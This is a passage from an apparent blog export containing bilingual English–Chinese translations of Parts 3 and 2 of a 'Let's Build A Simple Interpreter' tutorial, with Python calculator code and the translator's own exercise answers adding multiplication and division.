让我们构建一个简单的解释器。第17部分: 调用堆栈和激活记录 Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls 让我们构建一个简单的解释器。第18部分: 执行过程调用 Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls 让我们构建一个简单的解释器。第19部分: 嵌套过程调用 ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part4/"},{"title":"[翻译与学习] Let’s Build A Simple Interpreter. Part3.","content":"I woke up this morning and I thought to myself: “Why do we find it so difficult to learn a new skill?” 今天早上我醒来，我对自己说: “为什么我们发现学习一项新技能如此困难?” I don’t think it’s just because of the hard work. I think that one of the reasons might be that we spend a lot of time and hard work acquiring knowledge by reading and watching and not enough time translating that knowledge into a skill by practicing it. Take swimming, for example. You can spend a lot of time reading hundreds of books about swimming, talk for hours with experienced swimmers and coaches, watch all the training videos available, and you still will sink like a rock the first time you jump in the pool. 我认为这不仅仅是因为辛苦的工作。我认为其中一个原因可能是我们花费了大量的时间和精力通过阅读和观察来获取知识，而没有足够的时间通过实践将知识转化为技能。以游泳为例。你可以花很多时间阅读数百本关于游泳的书籍，与经验丰富的游泳运动员和教练交谈几个小时，观看所有可用的训练视频，但是你仍然会在第一次跳进游泳池的时候像一块石头一样沉下去。 The bottom line is: it doesn’t matter how well you think you know the subject - you have to put that knowledge into practice to turn it into a skill. To help you with the practice part I put exercises into Part 1 and Part 2 of the series. And yes, you will see more exercises in today’s article and in future articles, I promise 😃 底线是: 无论你认为自己多么了解这门学科——你必须把这些知识转化为实践，把它变成一种技能。为了帮助您进行练习，我将练习放在本系列的第1部分和第2部分中。是的，你会在今天的文章和以后的文章中看到更多的练习，我保证:) Okay, let’s get started with today’s material, shall we? 好了，让我们开始今天的内容，好吗？ So far, you’ve learned how to interpret arithmetic expressions that add or subtract two integers like “7 + 3” or “12 - 9”. Today I’m going to talk about how to parse (recognize) and interpret arithmetic expressions that have any number of plus or minus operators in it, for example “7 - 3 + 2 - 1”. 到目前为止，你已经学习了如何解释加减两个整数的算术表达式，比如“7 + 3”或“12-9”。今天我将讨论如何解析（识别）和解释包含任意数量正负运算符的算术表达式，例如“7-3 + 2-1”。 Graphically, the arithmetic expressions in this article can be represented with the following syntax diagram: 从图形上看，本文中的算术表达式可以用以下语法图表示: What is a syntax diagram? A syntax diagram is a graphical representation of a programming language’s syntax rules. Basically, a syntax diagram visually shows you which statements are allowed in your programming language and which are not. 什么是语法图？语法图是编程语言语法规则的图形化表示。基本上，语法图可视化地显示编程语言中哪些语句是允许的，哪些是不允许的。 Syntax diagrams are pretty easy to read: just follow the paths indicated by the arrows. Some paths indicate choices. And some paths indicate loops. 语法图很容易阅读: 只需沿着箭头所指示的路径走就可以了。有些路径表示选择。有些路径表示循环。 You can read the above syntax diagram as following: a term optionally followed by a plus or minus sign, followed by another term, which in turn is optionally followed by a plus or minus sign followed by another term and so on. You get the picture, literally. You might wonder what a “term” is. For the purpose of this article a “term” is just an integer. 你可以阅读上面的语法图: 一个term可选地后跟一个加号或减号，再后面跟着另一个term，这个term又可选地后跟一个加号或减号，后面又跟着另一个term等等。你明白了吧，真的。你可能想知道“term”是什么。对于本文来说，“ term”只是一个整数。 Syntax diagrams serve two main purposes: 语法图有两个主要用途: They graphically represent the specification (grammar) of a programming language. 它们以图形方式表示编程语言的规范(语法) They can be used to help you write your parser - you can map a diagram to code by following simple rules. 它们可以用来帮助你编写解析器——你可以通过遵循简单的规则将图表映射到代码 You’ve learned that the process of recognizing a phrase in the stream of tokens is called parsing. And the part of an interpreter or compiler that performs that job is called a parser. Parsing is also called syntax analysis, and the parser is also aptly called, you guessed it right, a syntax analyzer. 你已经了解到，识别token流中的phrase的过程称为解析。解释器或编译器中执行这项工作的部分称为解析器。解析也称为语法分析，解析器也恰如其分地称为语法分析器（你猜对了）。 According to the syntax diagram above, all of the following arithmetic expressions are valid: 根据上面的语法图，下面所有的算术表达式都是有效的: 3 3 + 4 3 + 4 7 - 3 + 2 - 1 7-3 + 2-1 Because syntax rules for arithmetic expressions in different programming languages are very similar we can use a Python shell to “test” our syntax diagram. Launch your Python shell and see for yourself: 因为不同编程语言中算术表达式的语法规则非常相似，所以我们可以使用 Python shell 来“测试”我们的语法图。启动你的 Python shell，自己看看: &gt;&gt;&gt; 3 3 &gt;&gt;&gt; 3 + 4 7 &gt;&gt;&gt; 7 - 3 + 2 - 1 5 No surprises here. 这里没有惊喜。 The expression “3 + ” is not a valid arithmetic expression though because according to the syntax diagram the plus sign must be followed by a term (integer), otherwise it’s a syntax error. Again, try it with a Python shell and see for yourself: 表达式“3 +”不是一个有效的算术表达式，因为根据语法图表，加号后面必须跟着一个term(整数) ，否则它是一个语法错误。再次，用 Python shell 尝试一下，你自己看看: &gt;&gt;&gt; 3 + File &quot;&lt;stdin&gt;&quot;, line 1 3 + ^ SyntaxError: invalid syntax It’s great to be able to use a Python shell to do some testing but let’s map the above syntax diagram to code and use our own interpreter for testing, all right? 能够使用 Python shell 进行一些测试是很棒的，但是让我们将上面的语法图映射到代码中，并使用我们自己的解释器进行测试，好吗？ You know from the previous articles (Part 1 and Part 2) that the expr method is where both our parser and interpreter live. Again, the parser just recognizes the structure making sure that it corresponds to some specifications and the interpreter actually evaluates the expression once the parser has successfully recognized (parsed) it. 从前面的文章（第1部分和第2部分）中可以知道，expr 方法是我们的解析器和解释器所在的地方。同样，解析器只是识别结构，确保它对应于某些规范，并且解释器实际上在解析器成功识别（解析）表达式之后对其进行计算。 The following code snippet shows the parser code corresponding to the diagram. The rectangular box from the syntax diagram (term) becomes a term method that parses an integer and the expr method just follows the syntax diagram flow: 下面的代码片段显示了与图对应的解析器代码。语法图（term）中的矩形框变成了解析整数的 term 方法，expr 方法只遵循语法图流程： def term(self): self.eat(INTEGER) def expr(self): # set current token to the first token taken from the input self.current_token = self.get_next_token() self.term() while self.current_token.type in (PLUS, MINUS): token = self.current_token if token.type == PLUS: self.eat(PLUS) self.term() elif token.type == MINUS: self.eat(MINUS) self.term() You can see that expr first calls the term method. Then the expr method has a while loop which can execute zero or more times. And inside the loop the parser makes a choice based on the token (whether it’s a plus or minus sign). Spend some time proving to yourself that the code above does indeed follow the syntax diagram flow for arithmetic expressions. 可以看到 expr 首先调用 term 方法。然后 expr 方法有一个 while 循环，可以执行零次或更多次。在循环中，解析器根据token（是加号还是减号）做出选择。花些时间证明上面的代码确实遵循了算术表达式的语法图流程。 The parser itself does not interpret anything though: if it recognizes an expression it’s silent and if it doesn’t, it throws out a syntax error. Let’s modify the expr method and add the interpreter code: 但是解析器本身并不解释任何东西：如果它识别出一个表达式，那么它就是静默的，如果它没有，那么它就会抛出一个语法错误。让我们修改 expr 方法并添加解释器代码: def term(self): &quot;&quot;&quot;Return an INTEGER token value&quot;&quot;&quot; token = self.current_token # 获取当前token self.eat(INTEGER) # 如果当前token是整数 return token.value # 那么返回token的值 def expr(self): &quot;&quot;&quot;Parser / Interpreter &quot;&quot;&quot; # set current token to the first token taken from the input self.current_token = self.get_next_token() result = self.term() while self.current_token.type in (PLUS, MINUS): token = self.current_token if token.type == PLUS: self.eat(PLUS) result = result + self.term() elif token.type == MINUS: self.eat(MINUS) result = result - self.term() return result Because the interpreter needs to evaluate an expression the term method was modified to return an integer value and the expr method was modified to perform addition and subtraction at the appropriate places and return the result of interpretation. Even though the code is pretty straightforward I recommend spending some time studying it. 由于解释器需要计算一个表达式，所以对 term 方法进行了修改，以返回一个整数值，而对 expr 方法进行了修改，以便在适当的位置执行加减操作，并返回解释结果。尽管代码非常简单，我还是建议你花点时间研究一下。 Le’s get moving and see the complete code of the interpreter now, okay? 我们现在开始，看看解释器的完整代码，好吗？ Here is the source code for your new version of the calculator that can handle valid arithmetic expressions containing integers and any number of addition and subtraction operators: 下面是新版计算器的源代码，它可以处理包含整数和任意数量的加减运算符的有效算术表达式: # Token types # # EOF (end-of-file) token is used to indicate that # there is no more input left for lexical analysis INTEGER, PLUS, MINUS, EOF = 'INTEGER', 'PLUS', 'MINUS', 'EOF' class Token(object): def __init__(self, type, value): # token type: INTEGER, PLUS, MINUS, or EOF self.type = type # token value: non-negative integer value, '+', '-', or None self.value = value def __str__(self): &quot;&quot;&quot;String representation of the class instance. Examples: Token(INTEGER, 3) Token(PLUS, '+') &quot;&quot;&quot; return 'Token({type}, {value})'.format( type=self.type, value=repr(self.value) ) def __repr__(self): return self.__str__() class Interpreter(object): def __init__(self, text): # client string input, e.g. &quot;3 + 5&quot;, &quot;12 - 5 + 3&quot;, etc self.text = text # self.pos is an index into self.text self.pos = 0 # current token instance self.current_token = None self.current_char = self.text[self.pos] ########################################################## # Lexer code 词法分析器代码 # ########################################################## def error(self): raise Exception('Invalid syntax') def advance(self): &quot;&quot;&quot;Advance the `pos` pointer and set the `current_char` variable.&quot;&quot;&quot; self.pos += 1 if self.pos &gt; len(self.text) - 1: self.current_char = None # Indicates end of input else: self.current_char = self.text[self.pos] def skip_whitespace(self): while self.current_char is not None and self.current_char.isspace(): self.advance() def integer(self): &quot;&quot;&quot;Return a (multidigit) integer consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() return int(result) def get_next_token(self): &quot;&quot;&quot;Lexical analyzer (also known as scanner or tokenizer) This method is responsible for breaking a sentence apart into tokens. One token at a time. &quot;&quot;&quot; while self.current_char is not None: if self.current_char.isspace(): self.skip_whitespace() continue if self.current_char.isdigit(): return Token(INTEGER, self.integer()) if self.current_char == '+': self.advance() return Token(PLUS, '+') if self.current_char == '-': self.advance() return Token(MINUS, '-') self.error() return Token(EOF, None) ########################################################## # Parser / Interpreter code 解析器/解释器代码 # ########################################################## def eat(self, token_type): # compare the current token type with the passed token 比较当前token的type和传入的token的type是否一样 # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, 如果一样，则将self.get_next_token返回的值赋值给self.current_token # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.get_next_token() else: self.error() def term(self): &quot;&quot;&quot;Return an INTEGER token value. 返回一个 INTERGER token的值 &quot;&quot;&quot; token = self.current_token self.eat(INTEGER) return token.value def expr(self): &quot;&quot;&quot;Arithmetic expression parser / interpreter. 算术表达式解析器/解释器 &quot;&quot;&quot; # set current token to the first token taken from the input self.current_token = self.get_next_token() # 从输入获取第一个token result = self.term() # 得到第一个token的值，并将下一个token给self.current_token while self.current_token.type in (PLUS, MINUS): # 通过判断当前token的值是否是加法或减法 token = self.current_token # 操作符 if token.type == PLUS: # 根据操作符的类型，做相应的操作 self.eat(PLUS) # 吃掉+操作符，并将下一个token给self.current_token result = result + self.term() # self.term()返回“第二个”操作数的值，并将下一个token赋值给self.current_token，用于循环的进行，这是循环的关键！！！ elif token.type == MINUS: self.eat(MINUS) result = result - self.term() return result def main(): while True: try: text = input('calc&gt; ') except EOFError: break if not text: continue interpreter = Interpreter(text) result = interpreter.expr() print(result) if __name__ == '__main__': main() Save the above code into the calc3.py file or download it directly from GitHub. Try it out. See for yourself that it can handle arithmetic expressions that you can derive from the syntax diagram I showed you earlier. 将上面的代码保存到 calc3.py 文件中，或者直接从 GitHub 下载。尝试一下。你自己看看，它可以处理您可以从我前面给你展示的语法图中派生出来的算术表达式。 Here is a sample session that I ran on my laptop: 下面是我在笔记本电脑上运行的一个示例会话: $ python calc3.py calc&gt; 3 3 calc&gt; 7 - 4 3 calc&gt; 10 + 5 15 calc&gt; 7 - 3 + 2 - 1 5 calc&gt; 10 + 1 + 2 - 3 + 4 + 6 - 15 5 calc&gt; 3 + Traceback (most recent call last): File &quot;calc3.py&quot;, line 147, in &lt;module&gt; main() File &quot;calc3.py&quot;, line 142, in main result = interpreter.expr() File &quot;calc3.py&quot;, line 123, in expr result = result + self.term() File &quot;calc3.py&quot;, line 110, in term self.eat(INTEGER) File &quot;calc3.py&quot;, line 105, in eat self.error() File &quot;calc3.py&quot;, line 45, in error raise Exception('Invalid syntax') Exception: Invalid syntax Remember those exercises I mentioned at the beginning of the article: here they are, as promised 😃 还记得我在文章开头提到的大量练习吗 Draw a syntax diagram for arithmetic expressions that contain only multiplication and division, for example “7 * 4 / 2 * 3”. Seriously, just grab a pen or a pencil and try to draw one. 为只包含乘法和除法的算术表达式绘制语法图，例如“7 * 4/2 * 3”。说真的，抓起一支钢笔或铅笔试着画一个 Modify the source code of the calculator to interpret arithmetic expressions that contain only multiplication and division, for example “7 * 4 / 2 * 3”. 修改计算器的源代码以解释只包含乘法和除法的算术表达式，例如“7 * 4/2 * 3” Write an interpreter that handles arithmetic expressions like “7 - 3 + 2 - 1” from scratch. Use any programming language you’re comfortable with and write it off the top of your head without looking at the examples. When you do that, think about components involved: a lexer that takes an input and converts it into a stream of tokens, a parser that feeds off the stream of the tokens provided by the lexer and tries to recognize a structure in that stream, and an interpreter that generates results after the parser has successfully parsed (recognized) a valid arithmetic expression. String those pieces together. Spend some time translating the knowledge you’ve acquired into a working interpreter for arithmetic expressions. 编写一个解释器，从头开始处理算术表达式，如“7 - 3 + 2 - 1”。使用任何你熟悉的编程语言，不用看例子就直接写下来。当你这样做时，考虑一下相关的组件：一个获取输入并将其转换为一连串的token的词法分析器，一个从词法分析器获取token流，并尝试识别流结构的解析器，和一个在解析器成功解析一个算术表达式后生成结果的解释器。把这些碎片串在一起，花些时间把你学到的知识转换成一个算术表达式解释器。 我的答案： # Token types # # EOF (end-of-file) token is used to indicate that # there is no more input left for lexical analysis INTEGER, PLUS, MINUS, MUL, DIV, EOF = 'INTEGER', 'PLUS', 'MINUS', 'MUL', 'DIV', 'EOF' class Token(object): def __init__(self, type, value): # token type: INTEGER, PLUS, MINUS, or EOF self.type = type # token value: non-negative integer value, '+', '-', or None self.value = value def __str__(self): &quot;&quot;&quot;String representation of the class instance. Examples: Token(INTEGER, 3) Token(PLUS, '+') &quot;&quot;&quot; return 'Token({type}, {value})'.format( type=self.type, value=repr(self.value) ) def __repr__(self): return self.__str__() class Interpreter(object): def __init__(self, text): # client string input, e.g. &quot;3 + 5&quot;, &quot;12 - 5 + 3&quot;, etc self.text = text # self.pos is an index into self.text self.pos = 0 # current token instance self.current_token = None self.current_char = self.text[self.pos] ########################################################## # Lexer code 词法分析器代码 # ########################################################## def error(self): raise Exception('Invalid syntax') def advance(self): &quot;&quot;&quot;Advance the `pos` pointer and set the `current_char` variable.&quot;&quot;&quot; self.pos += 1 if self.pos &gt; len(self.text) - 1: self.current_char = None # Indicates end of input else: self.current_char = self.text[self.pos] def skip_whitespace(self): while self.current_char is not None and self.current_char.isspace(): self.advance() def integer(self): &quot;&quot;&quot;Return a (multidigit) integer consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() return int(result) def get_next_token(self): &quot;&quot;&quot;Lexical analyzer (also known as scanner or tokenizer) This method is responsible for breaking a sentence apart into tokens. One token at a time. &quot;&quot;&quot; while self.current_char is not None: if self.current_char.isspace(): self.skip_whitespace() continue if self.current_char.isdigit(): return Token(INTEGER, self.integer()) if self.current_char == '+': self.advance() return Token(PLUS, '+') if self.current_char == '-': self.advance() return Token(MINUS, '-') if self.current_char == '*': self.advance() return Token(MUL, '*') if self.current_char == '/': self.advance() return Token(DIV, '/') self.error() return Token(EOF, None) ########################################################## # Parser / Interpreter code 解析器/解释器代码 # ########################################################## def eat(self, token_type): # compare the current token type with the passed token 比较当前token的type和传入的token的type是否一样 # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, 如果一样，则将self.get_next_token返回的值赋值给self.current_token # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.get_next_token() else: self.error() def term(self): &quot;&quot;&quot;Return an INTEGER token value. 返回一个 INTERGER token的值 &quot;&quot;&quot; token = self.current_token self.eat(INTEGER) return token.value def expr(self): &quot;&quot;&quot;Arithmetic expression parser / interpreter. 算术表达式解析器/解释器 &quot;&quot;&quot; # set current token to the first token taken from the input self.current_token = self.get_next_token() # 从输入获取第一个token result = self.term() # 得到第一个token的值，并将下一个token给self.current_token while self.current_token.type in (PLUS, MINUS, MUL, DIV): # 通过判断当前token的值是否是加法或减法 token = self.current_token # 操作符 if token.type == PLUS: # 根据操作符的类型，做相应的操作 self.eat(PLUS) # 吃掉+操作符，并将下一个token给self.current_token result = result + self.term() # self.term()返回“第二个”操作数的值，并将下一个token赋值给self.current_token，用于循环的进行，这是循环的关键！！！ elif token.type == MINUS: self.eat(MINUS) result = result - self.term() elif token.type == MUL: self.eat(MUL) result = result * self.term() elif token.type == DIV: self.eat(DIV) right = self.term() if right == 0: self.error() else: result = result / right return result def main(): while True: try: text = input('calc&gt; ') except EOFError: break if not text: continue interpreter = Interpreter(text) result = interpreter.expr() print(result) if __name__ == '__main__': main() Check your understanding. 检查你的理解。 What is a syntax diagram? 什么是语法图？ 编程语言语法规则的图形化表示。语法图可视化地显示编程语言中哪些语句是允许的，哪些是不允许的 What is syntax analysis? 什么是语法分析？ 即解析。从token流中识别结构，得到phrase的过程 What is a syntax analyzer? 什么是语法分析器？ 即解析器。解释器/编译器执行解析的那部分。 Hey, look! You read all the way to the end. Thanks for hanging out here today and don’t forget to do the exercises. 😃 I’ll be back next time with a new article - stay tuned. 嘿，看！你从头读到尾。谢谢你今天来这里，别忘了做练习。(收集整理下次我会带来一篇新文章，敬请期待。 Here is a list of books I recommend that will help you in your study of interpreters and compilers: 以下是我推荐的一些书籍，它们可以帮助你学习解释器和编译器: Language Implementation Patterns: Create Your Own Domain-Specific and General Programming Languages (Pragmatic Programmers) 语言实现模式: 创建您自己的特定领域和通用编程语言(实用程序员) Writing Compilers and Interpreters: A Software Engineering Approach 编写编译器和解释器: 一种软件工程方法 Modern Compiler Implementation in Java 现代编译器在 Java 中的实现 Modern Compiler Design 现代编译器设计 Compilers: Principles, Techniques, and Tools (2nd Edition) 编译器: 原理、技术和工具(第二版) All articles in this series: 本系列的所有文章: Let's Build A Simple Interpreter. Part 1. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 2. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 3. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 4. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 5. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 6. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees 让我们构建一个简单的解释器。第7部分: 抽象语法树 Let's Build A Simple Interpreter. Part 8. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 9. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 10. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 11. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 12. Let's Build A Simple Interpreter. Part 13: Semantic Analysis Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler Let's Build A Simple Interpreter. Part 15. Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part3/"},{"title":"[翻译与学习] Let’s Build A Simple Interpreter. Part2.","content":"In their amazing book “The 5 Elements of Effective Thinking” the authors Burger and Starbird share a story about how they observed Tony Plog, an internationally acclaimed trumpet virtuoso, conduct a master class for accomplished trumpet players. The students first played complex music phrases, which they played perfectly well. But then they were asked to play very basic, simple notes. When they played the notes, the notes sounded childish compared to the previously played complex phrases. After they finished playing, the master teacher also played the same notes, but when he played them, they did not sound childish. The difference was stunning. Tony explained that mastering the performance of simple notes allows one to play complex pieces with greater control. The lesson was clear - to build true virtuosity one must focus on mastering simple, basic ideas.1 在著作《有效思考的五个要素》中，作者Burger 和 Starbird分享了一个关于他们如何观察Tony Plog的故事，Tony Plog是一个国际知名的小号演奏家，他在一个大师班指导成功的小号演奏家们。学生们首先演奏复杂的乐句，他们演奏得非常好。但之后他们被要求演奏非常基本、简单的音符时，与之前演奏的复杂乐句相比，这些音符听起来更像孩子气。演奏结束后，大师也演奏了同样的音符，但当他演奏时，这些音符听起来并不幼稚。这种差异令人震惊。Tony解释说，掌握简单音符的演奏能让人更好地控制复杂的乐章。这个教训很明显——要建立真正的精湛技艺，你必须专注于掌握简单、基本的思想。 The lesson in the story clearly applies not only to music but also to software development. The story is a good reminder to all of us to not lose sight of the importance of deep work on simple, basic ideas even if it sometimes feels like a step back. While it is important to be proficient with a tool or framework you use, it is also extremely important to know the principles behind them. As Ralph Waldo Emerson said: 这个故事中的教训显然不仅适用于音乐，也适用于软件开发。这个故事很好地提醒了我们所有人，不要忽视在简单基本的想法上进行深入工作的重要性，即使有时感觉像是后退了一步。虽然熟练使用您所使用的工具或框架很重要，但了解它们背后的原则也极为重要。正如拉尔夫·沃尔多·爱默生所说: “If you learn only methods, you’ll be tied to your methods. But if you learn principles, you can devise your own methods.” “如果你只学习方法，你就会受制于你的方法。但如果你学会了原理，你就可以设计出自己的方法。” On that note, let’s dive into interpreters and compilers again. 关于这一点，让我们再次深入到解释器和编译器中。 Today I will show you a new version of the calculator from Part 1 that will be able to: 今天我将向您展示来自第1部分的新版计算器，它将能够: Handle whitespace characters anywhere in the input string 处理输入字符串中任意位置的空格字符 Consume multi-digit integers from the input 在输入中使用多位整数 Subtract two integers (currently it can only add integers) 减去整数（目前只能加上整数） Here is the source code for your new version of the calculator that can do all of the above: 下面是你的新版计算器的源代码，它可以做到以上所有的事情: # Token types # EOF (end-of-file) token is used to indicate that # there is no more input left for lexical analysis INTEGER, PLUS, MINUS, EOF = 'INTEGER', 'PLUS', 'MINUS', 'EOF' class Token(object): def __init__(self, type, value): # token type: INTEGER, PLUS, MINUS, or EOF self.type = type # token value: non-negative integer value, '+', '-', or None self.value = value def __str__(self): &quot;&quot;&quot;String representation of the class instance. Examples: Token(INTEGER, 3) Token(PLUS '+') &quot;&quot;&quot; return 'Token({type}, {value})'.format( type=self.type, value=repr(self.value) ) def __repr__(self): return self.__str__() class Interpreter(object): def __init__(self, text): # client string input, e.g. &quot;3 + 5&quot;, &quot;12 - 5&quot;, etc self.text = text # self.pos is an index into self.text self.pos = 0 # current token instance self.current_token = None self.current_char = self.text[self.pos] def error(self): raise Exception('Error parsing input') def advance(self): &quot;&quot;&quot;Advance the 'pos' pointer and set the 'current_char' variable.&quot;&quot;&quot; self.pos += 1 if self.pos &gt; len(self.text) - 1: self.current_char = None # Indicates end of input else: self.current_char = self.text[self.pos] def skip_whitespace(self): while self.current_char is not None and self.current_char.isspace(): self.advance() def integer(self): &quot;&quot;&quot;Return a (multidigit) integer consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() return int(result) def get_next_token(self): &quot;&quot;&quot;Lexical analyzer (also known as scanner or tokenizer) This method is responsible for breaking a sentence apart into tokens. &quot;&quot;&quot; while self.current_char is not None: if self.current_char.isspace(): self.skip_whitespace() continue if self.current_char.isdigit(): return Token(INTEGER, self.integer()) if self.current_char == '+': self.advance() return Token(PLUS, '+') if self.current_char == '-': self.advance() return Token(MINUS, '-') self.error() return Token(EOF, None) def eat(self, token_type): # compare the current token type with the passed token # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.get_next_token() else: self.error() def expr(self): &quot;&quot;&quot;Parser / Interpreter expr -&gt; INTEGER PLUS INTEGER expr -&gt; INTEGER MINUS INTEGER &quot;&quot;&quot; # set current token to the first token taken from the input self.current_token = self.get_next_token() # we expect the current token to be an integer left = self.current_token self.eat(INTEGER) # we expect the current token to be either a '+' or '-' op = self.current_token if op.type == PLUS: self.eat(PLUS) else: self.eat(MINUS) # we expect the current token to be an integer right = self.current_token self.eat(INTEGER) # after the above call the self.current_token is set to # EOF token # at this point either the INTEGER PLUS INTEGER or # the INTEGER MINUS INTEGER sequence of tokens # has been successfully found and the method can just # return the result of adding or subtracting two integers, # thus effectively interpreting client input if op.type == PLUS: result = left.value + right.value else: result = left.value - right.value return result def main(): while True: try: text = input('calc&gt; ') except EOFError: break if not text: continue interpreter = Interpreter(text) result = interpreter.expr() print(result) if __name__ == '__main__': main() Save the above code into the calc2.py file or download it directly from GitHub. Try it out. See for yourself that it works as expected: it can handle whitespace characters anywhere in the input; it can accept multi-digit integers, and it can also subtract two integers as well as add two integers. 将上面的代码保存到 calc2.py 文件中，或者直接从 GitHub 下载。尝试一下。你可以亲自查看它是否正常工作:：它可以处理输入中的任何地方的空格字符；它可以接受多位整数，还可以做两个整数的减法以及加法。 Here is a sample session that I ran on my laptop: 下面是我在笔记本电脑上运行的一个示例会话: $ python calc2.py calc&gt; 27 + 3 30 calc&gt; 27 - 7 20 calc&gt; The major code changes compared with the version from Part 1 are: 与第1部分的版本相比，代码的主要变化如下: The get_next_token method was refactored a bit. The logic to increment the pos pointer was factored into a separate method advance. 对get_next_token方法进行了一点重构。pos指针增量的逻辑被分解为一个单独的方法。 Two more methods were added: skip_whitespace to ignore whitespace characters and integer to handle multi-digit integers in the input. 另外添加了两个方法：忽略空白字符的skip_whitespace和处理输入中的多数字整数的integer。 The expr method was modified to recognize INTEGER -&gt; MINUS -&gt; INTEGER phrase in addition to INTEGER -&gt; PLUS -&gt; INTEGER phrase. The method now also interprets both addition and subtraction after having successfully recognized the corresponding phrase. 改进了expr方法，除INTEGER -&gt; PLUS -&gt; INTEGER短语外，还可以识别INTEGER -&gt; MINUS -&gt; INTEGER短语。该方法在识别出相应的短语后，还能同时解释加减运算。 In Part 1 you learned two important concepts, namely that of a token and a lexical analyzer. Today I would like to talk a little bit about lexemes, parsing, and parsers. 在第1部分中，你学习了两个重要的概念，即token和词法分析器。今天，我想稍微谈谈词位、解析和解析器。 You already know about tokens. But in order for me to round out the discussion of tokens I need to mention lexemes. What is a lexeme? A lexeme is a sequence of characters that form a token. In the following picture you can see some examples of tokens and sample lexemes and hopefully it will make the relationship between them clear: 你已经知道token的事了。但是为了使关于token的讨论更加圆满，我需要提到词位（lexemes）。什么是词位？词位是构成token的字符序列。在下面的图片中，你可以看到一些token和词位的例子，希望它们之间的关系能够清晰起来: Now, remember our friend, the expr method? I said before that that’s where the interpretation of an arithmetic expression actually happens. But before you can interpret an expression you first need to recognize what kind of phrase it is, whether it is addition or subtraction, for example. That’s what the expr method essentially does: it finds the structure in the stream of tokens it gets from the get_next_token method and then it interprets the phrase that is has recognized, generating the result of the arithmetic expression. 还记得我们的朋友 expr 方法吗？我之前说过，这就是解释算术表达式实际发生的地方。但是在你解释一个表达式之前，你首先需要知道它是什么类型的短语，例如，是加法还是减法。这就是 expr 方法的本质: 它在从 get _ next _ token 方法获得的token流中找到结构，然后解释已被识别的短语，生成算术表达式的结果。 The process of finding the structure in the stream of tokens, or put differently, the process of recognizing a phrase in the stream of tokens is called parsing. The part of an interpreter or compiler that performs that job is called a parser. 在token流中查找结构的过程，或者换一种说法，在token流中识别一个短语的过程称为解析。解释器或编译器中执行该任务的部分称为解析器。 So now you know that the expr method is the part of your interpreter where both parsing and interpreting happens - the expr method first tries to recognize (parse) the INTEGER -&gt; PLUS -&gt; INTEGER or the INTEGER -&gt; MINUS -&gt; INTEGER phrase in the stream of tokens and after it has successfully recognized (parsed) one of those phrases, the method interprets it and returns the result of either addition or subtraction of two integers to the caller. 现在你知道了 expr 方法是解释器的一部分，解析和解释都在其中进行—— expr 方法首先尝试在token流中识别（解析） INTEGER-&gt; PLUS-&gt; INTEGER 或 INTEGER-&gt; MINUS-&gt; INTEGER 短语，并在成功识别（解析）这些短语中的一个之后，该方法对其进行解释，并将两个整数的加法或减法结果返回给调用者。 And now it’s time for exercises again. 现在又到了练习的时间了。 Extend the calculator to handle multiplication of two integers 扩展计算器以处理两个整数的乘法 Extend the calculator to handle division of two integers 扩展计算器以处理两个整数的除法 前两个问题的答案： # Token types # EOF (end-of-file) token is used to indicate that # there is no more input left for lexical analysis INTEGER, PLUS, MINUS, MUL, DIV, EOF = 'INTEGER', 'PLUS', 'MINUS', 'MUL', 'DIV', 'EOF' class Token(object): def __init__(self, type, value): # token type: INTEGER, PLUS, MINUS, or EOF self.type = type # token value: non-negative integer value, '+', '-', or None self.value = value def __str__(self): &quot;&quot;&quot;String representation of the class instance. Examples: Token(INTEGER, 3) Token(PLUS '+') &quot;&quot;&quot; return 'Token({type}, {value})'.format( type=self.type, value=repr(self.value) ) def __repr__(self): return self.__str__() class Interpreter(object): def __init__(self, text): # client string input, e.g. &quot;3 + 5&quot;, &quot;12 - 5&quot;, etc self.text = text # self.pos is an index into self.text self.pos = 0 # current token instance self.current_token = None self.current_char = self.text[self.pos] def error(self): raise Exception('Error parsing input') def advance(self): &quot;&quot;&quot;Advance the 'pos' pointer and set the 'current_char' variable. pos指针前进一步 &quot;&quot;&quot; self.pos += 1 if self.pos &gt; len(self.text) - 1: self.current_char = None # Indicates end of input else: self.current_char = self.text[self.pos] def skip_whitespace(self): &quot;&quot;&quot; 跳过空格 &quot;&quot;&quot; while self.current_char is not None and self.current_char.isspace(): self.advance() def integer(self): &quot;&quot;&quot;Return a (multidigit) integer consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() return int(result) def get_next_token(self): &quot;&quot;&quot;Lexical analyzer (also known as scanner or tokenizer) This method is responsible for breaking a sentence apart into tokens. &quot;&quot;&quot; while self.current_char is not None: if self.current_char.isspace(): self.skip_whitespace() continue if self.current_char.isdigit(): return Token(INTEGER, self.integer()) if self.current_char == '+': self.advance() return 